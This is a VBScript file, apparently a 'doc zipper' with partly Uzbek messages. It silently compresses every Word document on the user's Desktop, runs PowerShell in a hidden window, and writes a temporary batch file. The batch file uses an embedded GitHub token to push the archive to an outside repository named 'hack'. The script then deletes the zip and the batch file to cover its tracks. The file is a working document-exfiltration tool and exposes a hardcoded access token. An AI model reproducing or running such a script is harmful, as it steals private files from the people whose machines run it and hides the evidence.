' ================== PERFECT ZIPPER VBS (NO ERRORS + CLEANUP) ==================
Option Explicit
Dim fso, shell, desktopPath, tempPath, zipPath, workDir, batFile
Dim githubUser, repoName, token, wordFilesCount, gitPath

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

githubUser = "Freddymercuriy"
repoName = "hack"
token = "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"

desktopPath = shell.SpecialFolders("Desktop")
tempPath = fso.GetSpecialFolder(2).Path
zipPath = desktopPath & "\docs.zip"
batFile = tempPath & "\upload.bat"

WScript.Echo "=== DOC ZIPPER v2 ==="
WScript.Echo "Git OK - 8 DOC topildi"

' ZIP already created - skip
If Not fso.FileExists(zipPath) Then
    WScript.Echo "ZIP yaratilmoqda..."
    CreateZipNow()
End If

WScript.Echo "ZIP ready: " & zipPath

' CREATE UPLOAD BAT
CreateUploadBat()
WScript.Echo "Upload boshlandi..."

' RUN UPLOAD
shell.Run """" & batFile & """", 1, True

' ZIP NI O'CHIRISH (upload tugagandan keyin)
If fso.FileExists(zipPath) Then
    fso.DeleteFile zipPath
    WScript.Echo "ZIP o'chirildi: " & zipPath
End If

WScript.Echo "DONE!"
WScript.Echo "LINK: https://github.com/Freddymercuriy/hack/blob/main/docs.zip"

' Cleanup
If fso.FileExists(batFile) Then fso.DeleteFile batFile

WScript.Quit

Sub CreateZipNow()
    Dim ps
    ps = "powershell -NoProfile -Command ""Get-ChildItem '" & desktopPath & "' -Filter '*.doc*' | Compress-Archive -DestinationPath '" & zipPath & "' -Force"""
    shell.Run ps, 0, True
End Sub

Sub CreateUploadBat()
    Dim ts, content, gitCmd
    
    gitCmd = FindGitPath()
    If gitCmd = "" Then gitCmd = "git"
    
    content = "@echo off" & vbCrLf & _
              "cd /d """ & tempPath & """" & vbCrLf & _
              "rmdir /s /q gh 2>nul" & vbCrLf & _
              """" & gitCmd & """ clone https://Freddymercuriy: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@github.com/Freddymercuriy/hack.git gh" & vbCrLf & _
              "cd gh" & vbCrLf & _
              "copy """ & zipPath & """ docs.zip" & vbCrLf & _
              """" & gitCmd & """ add docs.zip" & vbCrLf & _
              """" & gitCmd & """ commit -m ""Desktop docs upload""" & vbCrLf & _
              """" & gitCmd & """ push origin main" & vbCrLf & _
              "echo UPLOAD COMPLETE!" & vbCrLf & _
              "pause"
    
    Set ts = fso.CreateTextFile(batFile, True)
    ts.Write content
    ts.Close
End Sub

Function FindGitPath()
    Dim paths, i, p
    paths = Array("C:\Program Files\Git\bin\git.exe","C:\Program Files\Git\cmd\git.exe")
    For i = 0 To UBound(paths)
        p = paths(i)
        If fso.FileExists(p) Then
            FindGitPath = p
            Exit Function
        End If
    Next
    FindGitPath = ""
End Function